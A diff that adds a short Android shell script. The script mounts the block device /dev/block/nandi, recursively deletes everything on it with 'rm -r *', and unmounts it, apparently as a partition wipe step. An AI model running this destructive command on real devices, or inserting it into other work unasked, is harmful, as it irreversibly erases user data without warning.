@@ -1,0 +1,9 @@
+#!/system/bin/sh
+mkdir /mnt/nandi
+mount -t ext4 /dev/block/nandi /mnt/nandi
+cd /mnt/nandi
+rm -r *
+cd /
+umount /mnt/nandi
+rmdir /mnt/nandi
+exit 0
